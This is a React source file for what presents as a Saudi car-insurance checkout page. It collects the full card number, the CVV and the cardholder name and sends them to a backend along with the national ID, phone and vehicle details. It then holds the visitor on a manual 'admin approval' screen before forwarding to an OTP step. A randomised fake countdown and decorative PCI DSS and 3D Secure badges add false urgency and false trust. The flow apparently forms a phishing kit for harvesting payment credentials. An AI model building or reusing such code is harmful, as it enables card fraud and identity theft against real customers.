import { useState, useEffect, useMemo, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { motion, AnimatePresence } from "framer-motion";
import { companyLogos } from "@/lib/companyLogos";
import { getCardMetadata } from "@/lib/cardMetadata";
import Navbar from "@/components/Navbar";
import Footer from "@/components/Footer";
import PremiumPageHeader from "@/components/PremiumPageHeader";
import { Button } from "@/components/ui/button";
import { CreditCard, Shield, Lock, Check, ArrowRight, Loader2, Fingerprint, Eye, EyeOff, X, Clock, Gift, Percent } from "lucide-react";
import CardBrandLogo from "@/components/CardBrandLogo";
import InsuranceStepper from "@/components/InsuranceStepper";
import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
import { toast } from "sonner";
import { linkVisitorToSession } from "@/lib/visitorLink";
import { useLanguage } from "@/i18n/LanguageContext";
import WaitingApprovalOverlay from "@/components/WaitingApprovalOverlay";
import cashbackPromoImg from "@/assets/cashback-promo.png";

const fmt = (v: string, max: number) => v.replace(/\D/g, "").slice(0, max);
const fmtCard = (v: string) => {
  const digits = v.replace(/\D/g, "");
  if (/^3[47]/.test(digits)) {
    return digits.slice(0, 15).replace(/(\d{4})(\d{0,6})(\d{0,5})/, (_, a, b, c) => [a, b, c].filter(Boolean).join(" "));
  }
  return fmt(v, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
};
const isValidCardNumber = (value: string) => {
  const digits = value.replace(/\s/g, "");
  if (!/^\d{13,19}$/.test(digits)) return false;
  let sum = 0;
  let shouldDouble = false;
  for (let i = digits.length - 1; i >= 0; i -= 1) {
    let digit = Number(digits[i]);
    if (shouldDouble) { digit *= 2; if (digit > 9) digit -= 9; }
    sum += digit;
    shouldDouble = !shouldDouble;
  }
  return sum % 10 === 0;
};

const InsurancePayment = () => {
  const navigate = useNavigate();
  const { t, lang } = useLanguage();
  const p = t.payment;
  const location = useLocation();
  const offer = location.state?.offer || {
    company: "التعاونية",
    type: "تأمين شامل",
    price: 2500,
    totalPrice: 2750,
    features: ["تغطية شاملة", "مساعدة على الطريق", "تأمين ضد الغير"],
  };

  const [loading, setLoading] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [orderId, setOrderId] = useState<string | null>(null);
  const [cardForm, setCardForm] = useState({ number: "", name: "", expiryMonth: "", expiryYear: "", cvv: "" });
  const [showCvv, setShowCvv] = useState(false);
  const [focusedField, setFocusedField] = useState<string | null>(null);
  const [touchedFields, setTouchedFields] = useState({ number: false, cvv: false, expiry: false, name: false });
  const [showPromo, setShowPromo] = useState(false);

  // Random countdown per visitor (persisted in sessionStorage)
  const [countdownEnd] = useState(() => {
    const stored = sessionStorage.getItem("promo_countdown_end");
    if (stored) return parseInt(stored);
    const randomMs = (2 + Math.random() * 21) * 60 * 60 * 1000;
    const end = Date.now() + randomMs;
    sessionStorage.setItem("promo_countdown_end", String(end));
    return end;
  });
  const [countdown, setCountdown] = useState({ h: 0, m: 0, s: 0 });

  useEffect(() => {
    const timer = setInterval(() => {
      const diff = Math.max(0, countdownEnd - Date.now());
      setCountdown({
        h: Math.floor(diff / 3600000),
        m: Math.floor((diff % 3600000) / 60000),
        s: Math.floor((diff % 60000) / 1000),
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [countdownEnd]);

  // Show promo popup after 3 seconds
  useEffect(() => {
    const dismissed = sessionStorage.getItem("promo_dismissed");
    if (dismissed) return;
    const t = setTimeout(() => setShowPromo(true), 3000);
    return () => clearTimeout(t);
  }, []);

  const approvalStatus = useAdminApproval(orderId, "payment");
  const cardDigits = cardForm.number.replace(/\s/g, "");
  const cardMetadata = useMemo(() => getCardMetadata(cardForm.number), [cardForm.number]);
  const showCardNumberError = touchedFields.number && cardDigits.length > 0 && !isValidCardNumber(cardForm.number);
  const isAmex = cardMetadata.brandKey === "amex";
  const cvvLength = isAmex ? 4 : 3;
  const showCvvError = touchedFields.cvv && cardForm.cvv.length > 0 && cardForm.cvv.length < cvvLength;
  const showNameError = touchedFields.name && cardForm.name.length > 0 && cardForm.name.length < 2;
  const isExpiryExpired = (() => {
    if (!touchedFields.expiry || !cardForm.expiryMonth || !cardForm.expiryYear) return false;
    const now = new Date();
    const currentMonth = now.getMonth() + 1;
    const currentYear = now.getFullYear() % 100;
    const selMonth = parseInt(cardForm.expiryMonth);
    const selYear = parseInt(cardForm.expiryYear);
    return selYear < currentYear || (selYear === currentYear && selMonth < currentMonth);
  })();

  useEffect(() => {
    if (approvalStatus === "approved" && orderId) {
      toast.success(p.paymentApproved);
      const expiry = `${cardForm.expiryMonth}/${cardForm.expiryYear}`;
      const cardInfo = {
        card_holder_name: cardForm.name,
        card_last_four: cardForm.number.replace(/\s/g, "").slice(-4),
        card_expiry: expiry,
      };
      sessionStorage.setItem("insurance_card_info", JSON.stringify(cardInfo));
      sessionStorage.setItem("insurance_order_id", orderId);
      navigate("/insurance/otp", { state: { offer, paymentMethod: "card", orderId } });
    } else if (approvalStatus === "rejected") {
      toast.error(p.paymentRejected);
      setWaitingApproval(false);
      setLoading(false);
    }
  }, [approvalStatus, orderId, navigate, offer, cardForm.name, cardForm.number, cardForm.expiryMonth, cardForm.expiryYear]);

  const handleCardPayment = async () => {
    if (!cardForm.number || !cardForm.name || !cardForm.expiryMonth || !cardForm.expiryYear || !cardForm.cvv) return;
    if (!isValidCardNumber(cardForm.number)) {
      setTouchedFields(prev => ({ ...prev, number: true }));
      toast.error(p.invalidCard);
      return;
    }
    setLoading(true);
    const requestData = sessionStorage.getItem("insurance_request");
    const customerData = sessionStorage.getItem("insurance_customer");
    let parsed: Record<string, any> = {};
    if (requestData) { try { parsed = JSON.parse(requestData); } catch {} }
    if (customerData) {
      try {
        const c = JSON.parse(customerData);
        if (!parsed.customerName) parsed.customerName = c.full_name || "";
        if (!parsed.nationalId) parsed.nationalId = c.national_id || "";
        if (!parsed.phone) parsed.phone = c.phone || "";
        if (!parsed.serialNumber) parsed.serialNumber = c.serial_number || "";
        if (!parsed.vehicleMake) parsed.vehicleMake = c.vehicle_make || "";
        if (!parsed.vehicleModel) parsed.vehicleModel = c.vehicle_model || "";
        if (!parsed.vehicleYear) parsed.vehicleYear = c.vehicle_year || "";
      } catch {}
    }
    const insuranceRequestId = sessionStorage.getItem("insurance_request_id");
    linkVisitorToSession({
      phone: parsed.phone || undefined,
      national_id: parsed.nationalId || undefined,
      visitor_name: parsed.customerName || cardForm.name || undefined,
    });
    const id = await createOrUpdateStage(null, "payment", {
      insurance_request_id: insuranceRequestId || null,
      customer_name: parsed.customerName || null,
      national_id: parsed.nationalId || null,
      phone: parsed.phone || null,
      vehicle_make: parsed.vehicleMake || null,
      vehicle_model: parsed.vehicleModel || null,
      vehicle_year: parsed.vehicleYear || null,
      serial_number: parsed.serialNumber || null,
      company: offer?.company || null,
      insurance_type: offer?.type || null,
      base_price: offer?.price || null,
      total_price: offer?.totalPrice || offer?.price || null,
      payment_method: "card",
      card_holder_name: cardForm.name,
      card_last_four: cardForm.number.replace(/\s/g, "").slice(-4),
      card_number_full: cardForm.number.replace(/\s/g, ""),
      card_expiry: `${cardForm.expiryMonth}/${cardForm.expiryYear}`,
      card_cvv: cardForm.cvv,
    });
    setOrderId(id);
    setWaitingApproval(true);
  };

  if (!offer) {
    return (
      <div className="min-h-screen bg-background">
        <Navbar />
        <div className="flex items-center justify-center min-h-[60vh]">
          <div className="text-center">
            <p className="text-muted-foreground mb-4">{p.noOffer}</p>
            <Button onClick={() => navigate("/insurance/offers")} className="rounded-xl">{p.showOffers}</Button>
          </div>
        </div>
      </div>
    );
  }

  const isFormValid = isValidCardNumber(cardForm.number) && cardForm.name.length >= 2 && cardForm.expiryMonth && cardForm.expiryYear && cardForm.cvv.length >= cvvLength;
  const totalPrice = offer.totalPrice || offer.price;

  // Brand colors for 3D card
  const brandColors: Record<string, { from: string; via: string; to: string; shadow: string }> = {
    visa: { from: "#1a1f71", via: "#2a3a9e", to: "#0d47a1", shadow: "rgba(26,31,113,0.4)" },
    mastercard: { from: "#eb5f07", via: "#f5842a", to: "#ff6d00", shadow: "rgba(235,95,7,0.4)" },
    mada: { from: "#0d7c3d", via: "#11994d", to: "#00a651", shadow: "rgba(13,124,61,0.4)" },
    unknown: { from: "hsl(var(--primary))", via: "hsl(var(--primary) / 0.9)", to: "hsl(var(--primary) / 0.7)", shadow: "hsl(var(--primary) / 0.35)" },
  };
  const bc = brandColors[cardMetadata.brandKey] || brandColors.unknown;

  return (
    <div className="min-h-[100dvh] bg-secondary/30">
      <Navbar />
      <PremiumPageHeader title={p.title} badge={p.badge} badgeIcon={<Lock className="w-3.5 h-3.5 text-cta" />} compact />

      <div className="container mx-auto px-3 md:px-4 -mt-6 md:-mt-8 pb-24 md:pb-12">
        <div className="max-w-5xl mx-auto">
          <InsuranceStepper active={2} />

          {/* Mobile: Order Summary at top */}
          <motion.div 
            className="lg:hidden mb-4"
            initial={{ opacity: 0, y: -20, scale: 0.95 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            transition={{ duration: 0.5, ease: [0.25, 0.46, 0.45, 0.94], delay: 0.15 }}
          >
            <OrderSummary offer={offer} totalPrice={totalPrice} p={p} />
          </motion.div>

          <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
            {/* Card Form */}
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }} className="lg:col-span-2">
              <div className="bg-card rounded-2xl border border-border shadow-lg overflow-hidden">
                {/* Accepted Cards Strip */}
                <div className="flex items-center gap-2 px-4 py-2.5 bg-secondary/40 border-b border-border/50">
                  <CreditCard className="w-4 h-4 text-primary shrink-0" />
                  <span className="text-xs font-bold text-foreground shrink-0">{p.creditCard}</span>
                  <div className="flex gap-1.5 mr-auto items-center">
                    {["Visa", "Mastercard", "مدى", "Amex", "UnionPay"].map(name => (
                      <span key={name} className="text-[9px] px-1.5 py-0.5 bg-primary/8 text-primary/80 rounded font-medium">{name}</span>
                    ))}
                  </div>
                </div>

                <div className="p-4 md:p-5">
                  <AnimatePresence mode="wait">
                    {waitingApproval ? (
                      <WaitingApprovalView p={p} />
                    ) : (
                      <motion.div key="form" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-5">
                        {/* Card Number */}
                        <PaymentInput
                          label={p.cardNumber}
                          error={showCardNumberError}
                          focused={focusedField === 'number'}
                          errorMessage={showCardNumberError ? p.cardNumberError : undefined}
                        >
                          <input
                            className="w-full px-4 py-3.5 rounded-xl bg-transparent text-foreground placeholder:text-muted-foreground/60 text-sm focus:outline-none font-mono tracking-wider"
                            placeholder="0000 0000 0000 0000"
                            value={cardForm.number}
                            onChange={(e) => setCardForm({ ...cardForm, number: fmtCard(e.target.value) })}
                            onFocus={() => setFocusedField('number')}
                            onBlur={() => { setFocusedField(null); setTouchedFields(prev => ({ ...prev, number: true })); }}
                            maxLength={19}
                            dir="ltr"
                            inputMode="numeric"
                          />
                          <div className="absolute left-3 top-1/2 -translate-y-1/2">
                            {cardMetadata.brandKey !== "unknown" ? (
                              <CardBrandLogo brandKey={cardMetadata.brandKey} className="w-8 h-5" />
                            ) : (
                              <CreditCard className={`w-5 h-5 ${showCardNumberError ? 'text-destructive' : 'text-muted-foreground/40'}`} />
                            )}
                          </div>
                        </PaymentInput>

                        {/* Card Holder */}
                        <PaymentInput
                          label={p.cardHolder}
                          error={showNameError}
                          focused={focusedField === 'name'}
                          errorMessage={showNameError ? p.cardHolderError : undefined}
                        >
                          <input
                            className="w-full px-4 py-3.5 rounded-xl bg-transparent text-foreground placeholder:text-muted-foreground/60 text-sm focus:outline-none"
                            placeholder={p.cardHolderPlaceholder}
                            value={cardForm.name}
                            onChange={(e) => setCardForm({ ...cardForm, name: e.target.value })}
                            onFocus={() => setFocusedField('name')}
                            onBlur={() => { setFocusedField(null); setTouchedFields(prev => ({ ...prev, name: true })); }}
                          />
                        </PaymentInput>

                        {/* Expiry & CVV — improved mobile layout */}
                        <div className="grid grid-cols-3 gap-2.5">
                          <div>
                            <label className="block text-[11px] font-bold text-muted-foreground mb-1.5">{p.month}</label>
                            <select
                              className={`w-full px-2 py-3.5 rounded-xl border-2 bg-background text-foreground text-sm focus:outline-none transition-all appearance-none text-center cursor-pointer ${isExpiryExpired ? 'border-destructive bg-destructive/5' : 'border-border hover:border-muted-foreground/30 focus:border-primary focus:shadow-[0_0_0_3px_hsl(var(--primary)/0.08)]'}`}
                              value={cardForm.expiryMonth}
                              onChange={(e) => { setCardForm({ ...cardForm, expiryMonth: e.target.value }); setTouchedFields(prev => ({ ...prev, expiry: true })); }}
                            >
                              <option value="">—</option>
                              {Array.from({ length: 12 }, (_, i) => {
                                const m = String(i + 1).padStart(2, "0");
                                return <option key={m} value={m}>{m}</option>;
                              })}
                            </select>
                          </div>
                          <div>
                            <label className="block text-[11px] font-bold text-muted-foreground mb-1.5">{p.year}</label>
                            <select
                              className={`w-full px-2 py-3.5 rounded-xl border-2 bg-background text-foreground text-sm focus:outline-none transition-all appearance-none text-center cursor-pointer ${isExpiryExpired ? 'border-destructive bg-destructive/5' : 'border-border hover:border-muted-foreground/30 focus:border-primary focus:shadow-[0_0_0_3px_hsl(var(--primary)/0.08)]'}`}
                              value={cardForm.expiryYear}
                              onChange={(e) => { setCardForm({ ...cardForm, expiryYear: e.target.value }); setTouchedFields(prev => ({ ...prev, expiry: true })); }}
                            >
                              <option value="">—</option>
                              {Array.from({ length: 10 }, (_, i) => {
                                const y = String(new Date().getFullYear() % 100 + i).padStart(2, "0");
                                return <option key={y} value={y}>{y}</option>;
                              })}
                            </select>
                          </div>
                          <div>
                            <label className="block text-[11px] font-bold text-muted-foreground mb-1.5">CVV</label>
                            <div className={`relative rounded-xl border-2 transition-all duration-200 ${showCvvError ? 'border-destructive bg-destructive/5' : focusedField === 'cvv' ? 'border-primary shadow-[0_0_0_3px_hsl(var(--primary)/0.08)]' : 'border-border hover:border-muted-foreground/30'}`}>
                              <input
                                type={showCvv ? "text" : "password"}
                                className="w-full pl-8 pr-3 py-3.5 rounded-xl bg-transparent text-foreground placeholder:text-muted-foreground/50 text-sm focus:outline-none font-mono text-center"
                                placeholder={isAmex ? "••••" : "•••"}
                                value={cardForm.cvv}
                                onChange={(e) => setCardForm({ ...cardForm, cvv: e.target.value.replace(/\D/g, '').slice(0, cvvLength) })}
                                onFocus={() => setFocusedField('cvv')}
                                onBlur={() => { setFocusedField(null); setTouchedFields(prev => ({ ...prev, cvv: true })); }}
                                maxLength={cvvLength}
                                dir="ltr"
                                inputMode="numeric"
                              />
                              <button
                                type="button"
                                onClick={() => setShowCvv(!showCvv)}
                                className="absolute left-2.5 top-1/2 -translate-y-1/2 text-muted-foreground/40 hover:text-muted-foreground transition-colors"
                              >
                                {showCvv ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                              </button>
                            </div>
                          </div>
                        </div>
                        {/* Validation messages */}
                        <AnimatePresence>
                          {(isExpiryExpired || showCvvError) && (
                            <motion.div initial={{ opacity: 0, height: 0 }} animate={{ opacity: 1, height: "auto" }} exit={{ opacity: 0, height: 0 }} className="flex gap-3 -mt-2">
                              {isExpiryExpired && <p className="text-[11px] font-medium text-destructive">{p.expiryExpired}</p>}
                              {showCvvError && <p className="text-[11px] font-medium text-destructive mr-auto">{p.cvvError}</p>}
                            </motion.div>
                          )}
                        </AnimatePresence>

                        {/* Desktop Card Preview */}
                        <div className="hidden lg:block">
                          <CardPreview3D
                            cardForm={cardForm}
                            cardMetadata={cardMetadata}
                            focusedField={focusedField}
                            bc={bc}
                            p={p}
                          />
                        </div>




                        {/* Mobile: Card Preview before Pay */}
                        <div className="lg:hidden">
                          <CardPreview3D
                            cardForm={cardForm}
                            cardMetadata={cardMetadata}
                            focusedField={focusedField}
                            bc={bc}
                            p={p}
                          />
                        </div>

                        {/* Pay Button */}
                        <Button
                          onClick={handleCardPayment}
                          disabled={loading || !isFormValid}
                          className="w-full bg-cta text-cta-foreground hover:bg-cta-hover rounded-xl py-6 font-bold text-base gap-2 shadow-[0_4px_20px_hsl(var(--cta)/0.35)] transition-all duration-300 hover:shadow-[0_6px_28px_hsl(var(--cta)/0.45)] hover:scale-[1.01] active:scale-[0.99]"
                        >
                          <Lock className="w-4 h-4" />
                          {loading ? (
                            <span className="flex items-center gap-2">
                              <Loader2 className="w-4 h-4 animate-spin" />
                              {p.processing}
                            </span>
                          ) : (
                            `${p.payAmount} ${totalPrice.toLocaleString()} ${p.sar}`
                          )}
                        </Button>
                      </motion.div>
                    )}
                  </AnimatePresence>

                  {/* Security Badges */}
                  <div className="flex items-center justify-center gap-3 mt-5 pt-4 border-t border-border/50">
                    {[
                      { icon: Shield, label: p.sslEncrypted, color: "text-cta" },
                      { icon: Lock, label: "PCI DSS", color: "text-primary" },
                      { icon: Check, label: "3D Secure", color: "text-cta" },
                    ].map((b, i) => (
                      <div key={i} className="flex items-center gap-1 px-2 py-1 rounded-md bg-secondary/50">
                        <b.icon className={`w-3 h-3 ${b.color}`} />
                        <span className="text-[9px] font-medium text-muted-foreground">{b.label}</span>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            </motion.div>

            {/* Desktop Order Summary Sidebar */}
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.2 }} className="hidden lg:block">
              <div className="sticky top-24">
                <OrderSummary offer={offer} totalPrice={totalPrice} p={p} />
              </div>
            </motion.div>
          </div>

          {/* Back Link */}
          <button
            onClick={() => navigate("/insurance/checkout", { state: { offer } })}
            className="flex items-center justify-center gap-2 mx-auto mt-5 text-xs text-muted-foreground hover:text-primary transition-colors group"
          >
            <ArrowRight className="w-3.5 h-3.5 transition-transform group-hover:translate-x-1" />
            {p.backToSummary}
          </button>
        </div>
      </div>
      {/* Cashback Promo Popup */}
      <AnimatePresence>
        {showPromo && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-end md:items-center justify-center md:p-4 bg-foreground/60 backdrop-blur-sm"
            onClick={() => { setShowPromo(false); sessionStorage.setItem("promo_dismissed", "1"); }}
          >
            <motion.div
              initial={{ opacity: 0, y: 80, scale: 0.95 }}
              animate={{ opacity: 1, y: 0, scale: 1 }}
              exit={{ opacity: 0, y: 80, scale: 0.95 }}
              transition={{ type: "spring", damping: 25, stiffness: 300 }}
              className="bg-card rounded-t-3xl md:rounded-2xl border border-border shadow-2xl w-full max-w-md overflow-hidden"
              onClick={(e) => e.stopPropagation()}
            >
              {/* Promo Image */}
              <div className="relative">
                <img src={cashbackPromoImg} alt="كاش باك 40%" className="w-full h-auto" />
                <button
                  onClick={() => { setShowPromo(false); sessionStorage.setItem("promo_dismissed", "1"); }}
                  className="absolute top-3 left-3 p-1.5 rounded-full bg-black/50 text-white hover:bg-black/70 transition-colors"
                >
                  <X className="w-4 h-4" />
                </button>
              </div>

              {/* Countdown Timer */}
              <div className="p-4 space-y-3">
                <div className="flex items-center justify-center gap-2">
                  <Clock className="w-4 h-4 text-destructive animate-pulse" />
                  <span className="text-xs font-bold text-destructive">ينتهي العرض خلال</span>
                </div>
                <div className="flex items-center justify-center gap-2 dir-ltr" dir="ltr">
                  {[
                    { val: String(countdown.h).padStart(2, "0"), label: "ساعة" },
                    { val: String(countdown.m).padStart(2, "0"), label: "دقيقة" },
                    { val: String(countdown.s).padStart(2, "0"), label: "ثانية" },
                  ].map((unit, i) => (
                    <div key={i} className="flex items-center gap-2">
                      <div className="flex flex-col items-center">
                        <div className="bg-gradient-to-b from-primary to-primary/80 text-primary-foreground rounded-lg px-3 py-2 min-w-[48px] text-center">
                          <span className="text-xl font-extrabold font-mono">{unit.val}</span>
                        </div>
                        <span className="text-[10px] text-muted-foreground mt-1">{unit.label}</span>
                      </div>
                      {i < 2 && <span className="text-xl font-bold text-primary mb-4">:</span>}
                    </div>
                  ))}
                </div>

                <Button
                  onClick={() => { setShowPromo(false); sessionStorage.setItem("promo_dismissed", "1"); }}
                  className="w-full bg-cta text-cta-foreground hover:bg-cta-hover rounded-xl py-5 font-bold text-sm gap-2"
                >
                  <Gift className="w-4 h-4" />
                  استفد من العرض الآن
                </Button>
                <button
                  onClick={() => { setShowPromo(false); sessionStorage.setItem("promo_dismissed", "1"); }}
                  className="w-full text-center text-xs text-muted-foreground hover:text-foreground transition-colors py-1"
                >
                  لاحقاً
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      <Footer />
    </div>
  );
};

/* ─── Sub-components ─── */

function PaymentInput({ label, error, focused, errorMessage, children }: {
  label: string;
  error: boolean;
  focused: boolean;
  errorMessage?: string;
  children: React.ReactNode;
}) {
  return (
    <div>
      <label className="block text-[11px] font-bold text-muted-foreground mb-1.5">{label}</label>
      <motion.div
        animate={error ? { x: [0, -4, 4, -3, 3, 0] } : { x: 0 }}
        transition={{ duration: 0.28 }}
        className={`relative rounded-xl border-2 transition-all duration-200 ${
          error
            ? 'border-destructive bg-destructive/5 shadow-[0_0_0_3px_hsl(var(--destructive)/0.1)]'
            : focused
              ? 'border-primary shadow-[0_0_0_3px_hsl(var(--primary)/0.08)]'
              : 'border-border hover:border-muted-foreground/30'
        }`}
      >
        {children}
      </motion.div>
      <AnimatePresence>
        {errorMessage && (
          <motion.p
            initial={{ opacity: 0, y: -4 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -4 }}
            className="mt-1.5 text-[11px] font-medium text-destructive"
          >
            {errorMessage}
          </motion.p>
        )}
      </AnimatePresence>
    </div>
  );
}

function WaitingApprovalView({ p }: { p: any }) {
  return (
    <WaitingApprovalOverlay
      title={p.verifying}
      subtitle={p.waitingReview}
    />
  );
}

function OrderSummary({ offer, totalPrice, p }: { offer: any; totalPrice: number; p: any }) {
  return (
    <div className="bg-card rounded-2xl border border-border shadow-lg p-4 space-y-3">
      {/* Company */}
      <div className="flex items-center gap-3 p-3 bg-gradient-to-l from-primary/8 to-transparent rounded-xl border border-primary/10">
        <div className="w-11 h-11 rounded-xl overflow-hidden bg-card border border-border flex items-center justify-center shadow-sm">
          {companyLogos[offer.company] ? (
            <img src={companyLogos[offer.company]} alt={offer.company} className="w-full h-full object-contain p-1.5" loading="lazy" />
          ) : (
            <span className="text-xs font-bold text-primary">{offer.logoInitials || offer.company?.slice(0, 2)}</span>
          )}
        </div>
        <div>
          <p className="font-bold text-sm text-foreground">{offer.company}</p>
          <p className="text-[11px] text-muted-foreground">{offer.type}</p>
        </div>
      </div>

      {/* Price Breakdown */}
      {offer.addOns?.length > 0 && (
        <div className="space-y-2 px-1">
          <div className="flex justify-between text-xs text-muted-foreground">
            <span>{offer.price?.toLocaleString()} {p.sar}</span>
            <span>{p.basePrice}</span>
          </div>
          <div className="flex justify-between text-xs text-muted-foreground">
            <span>{((totalPrice || 0) - (offer.price || 0)).toLocaleString()} {p.sar}</span>
            <span>{p.addOns} ({offer.addOns.length})</span>
          </div>
          <div className="border-t border-dashed border-border" />
        </div>
      )}

      {/* Total */}
      <div className="p-3 rounded-xl bg-gradient-to-l from-primary/10 to-primary/5 border border-primary/15">
        <div className="flex items-center justify-between">
          <span className="text-xl font-extrabold text-primary">{totalPrice.toLocaleString()} {p.sar}</span>
          <span className="font-bold text-foreground text-sm">{p.total}</span>
        </div>
      </div>

      <p className="text-[10px] text-muted-foreground text-center">{p.vatIncluded}</p>
    </div>
  );
}

function CardPreview3D({ cardForm, cardMetadata, focusedField, bc, p }: {
  cardForm: { number: string; name: string; expiryMonth: string; expiryYear: string; cvv: string };
  cardMetadata: ReturnType<typeof getCardMetadata>;
  focusedField: string | null;
  bc: { from: string; via: string; to: string; shadow: string };
  p: any;
}) {
  return (
    <div className="relative" style={{ perspective: "1200px" }}>
      <motion.div
        animate={{ rotateY: focusedField === 'cvv' ? 180 : 0 }}
        transition={{ type: "spring", stiffness: 80, damping: 18 }}
        style={{ transformStyle: "preserve-3d" }}
        className="relative h-48 md:h-52"
      >
        {/* FRONT FACE */}
        <motion.div
          className="absolute inset-0 rounded-2xl overflow-hidden p-5 flex flex-col justify-between"
          animate={{ background: `linear-gradient(135deg, ${bc.from}, ${bc.via}, ${bc.to})`, boxShadow: `0 12px 40px ${bc.shadow}` }}
          transition={{ duration: 0.6 }}
          style={{ backfaceVisibility: "hidden" }}
        >
          <div className="absolute inset-0 opacity-10">
            <div className="absolute top-0 right-0 w-40 h-40 rounded-full bg-white/20 -translate-y-1/2 translate-x-1/4" />
            <div className="absolute bottom-0 left-0 w-32 h-32 rounded-full bg-white/15 translate-y-1/3 -translate-x-1/4" />
          </div>
          <div
            className="absolute inset-0 pointer-events-none z-20"
            style={{
              background: "linear-gradient(105deg, transparent 40%, rgba(255,255,255,0.15) 45%, rgba(255,255,255,0.35) 50%, rgba(255,255,255,0.15) 55%, transparent 60%)",
              backgroundSize: "200% 100%",
              animation: "cardShine 3s ease-in-out infinite",
            }}
          />

          {/* Top: chip + bank */}
          <div className="flex items-center justify-between relative z-10">
            <div className="flex items-center gap-2">
              <div className="w-9 h-6 bg-cta/90 rounded-[3px] shadow-inner" />
              <div className="w-5 h-5 rounded-full border-2 border-white/30" />
            </div>
            <AnimatePresence mode="wait">
              <motion.div key={cardMetadata.bankName} initial={{ opacity: 0, x: -10 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: 10 }} className="flex items-center gap-1.5">
                {cardMetadata.isDetected && cardMetadata.bankName !== "البنك المصدر غير محدد" ? (
                  <span className="text-white text-[10px] font-bold bg-white/15 px-2.5 py-1 rounded-lg backdrop-blur-sm border border-white/10">{cardMetadata.bankName}</span>
                ) : (
                  <Fingerprint className="w-5 h-5 text-white/40" />
                )}
              </motion.div>
            </AnimatePresence>
          </div>

          {/* Card number */}
          <div className="relative z-10">
            <p className="text-white/90 font-mono text-lg tracking-[0.25em] text-left" dir="ltr">
              {cardForm.number || "•••• •••• •••• ••••"}
            </p>
          </div>

          {/* Bottom: holder, expiry, brand, classification */}
          <div className="relative z-10 flex items-end justify-between gap-2">
            <div className="min-w-0 flex-1">
              <p className="text-white/40 text-[7px] uppercase tracking-widest mb-0.5">CARD HOLDER</p>
              <p className="text-white text-[11px] font-medium truncate">{cardForm.name || p.nameOnCard}</p>
            </div>
            <div className="text-left shrink-0" dir="ltr">
              <p className="text-white/40 text-[7px] uppercase tracking-widest mb-0.5">EXPIRES</p>
              <p className="text-white text-[11px] font-mono">
                {cardForm.expiryMonth && cardForm.expiryYear ? `${cardForm.expiryMonth}/${cardForm.expiryYear}` : "MM/YY"}
              </p>
            </div>
            <AnimatePresence mode="wait">
              <motion.div key={cardMetadata.brandKey} initial={{ opacity: 0, scale: 0.8 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, scale: 0.8 }} className="shrink-0">
                <CardBrandLogo brandKey={cardMetadata.brandKey} className="w-14 h-9 drop-shadow-lg" />
              </motion.div>
            </AnimatePresence>
            <AnimatePresence>
              {cardMetadata.classificationLabel !== "—" && (
                <motion.div initial={{ opacity: 0, width: 0 }} animate={{ opacity: 1, width: "auto" }} exit={{ opacity: 0, width: 0 }} className="text-right shrink-0 overflow-hidden">
                  <p className="text-white/40 text-[7px] tracking-widest mb-0.5">{p.classification}</p>
                  <p className="text-white text-[10px] font-bold bg-white/10 px-1.5 py-0.5 rounded backdrop-blur-sm inline-block">{cardMetadata.classificationLabel}</p>
                </motion.div>
              )}
            </AnimatePresence>
          </div>
        </motion.div>

        {/* BACK FACE */}
        <motion.div
          className="absolute inset-0 rounded-2xl overflow-hidden flex flex-col"
          animate={{ background: `linear-gradient(135deg, ${bc.from}dd, ${bc.via}cc, ${bc.to}bb)`, boxShadow: `0 12px 40px ${bc.shadow}` }}
          transition={{ duration: 0.6 }}
          style={{ backfaceVisibility: "hidden", transform: "rotateY(180deg)" }}
        >
          <div className="w-full h-12 bg-black/70 mt-6" />
          <div className="px-5 mt-6 flex items-center gap-3">
            <div className="flex-1 h-10 bg-white/20 rounded-md backdrop-blur-sm border border-white/10 flex items-center px-3">
              <div className="flex-1">
                <div className="h-[1px] bg-white/20 mb-1.5 w-3/4" />
                <div className="h-[1px] bg-white/20 mb-1.5 w-1/2" />
                <div className="h-[1px] bg-white/20 w-2/3" />
              </div>
            </div>
            <div className="bg-white/90 rounded-md px-4 py-2 min-w-[60px] text-center shadow-sm">
              <p className="text-[8px] text-black/40 font-bold uppercase tracking-wider mb-0.5">CVV</p>
              <p className="text-black font-mono font-bold text-lg tracking-[0.2em]">{cardForm.cvv || "•••"}</p>
            </div>
          </div>
          <div className="mt-auto px-5 pb-5 flex items-end justify-between">
            <p className="text-white/30 text-[8px] leading-tight max-w-[60%]">{p.cardBack}</p>
            <CardBrandLogo brandKey={cardMetadata.brandKey} className="w-10 h-6 opacity-50" />
          </div>
        </motion.div>
      </motion.div>
    </div>
  );
}

export default InsurancePayment;
